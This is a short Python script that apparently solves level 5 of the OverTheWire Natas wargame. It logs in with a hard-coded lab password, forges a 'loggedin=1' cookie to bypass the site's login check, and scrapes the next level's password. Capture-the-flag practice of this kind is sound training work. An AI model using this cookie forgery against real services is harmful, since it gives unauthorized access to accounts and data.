#!/usr/bin/env python

import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

#headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}

cookies = { "loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/' %username

#response = requests.get(url, auth = (username, password), headers = headers)
session = requests.Session()

response = session.get(url, auth = (username, password), cookies = cookies )
content = response.text

#print session.cookies['loggedin']
#print content
 
print re.findall('The password for natas6 is (.*)', content)[0]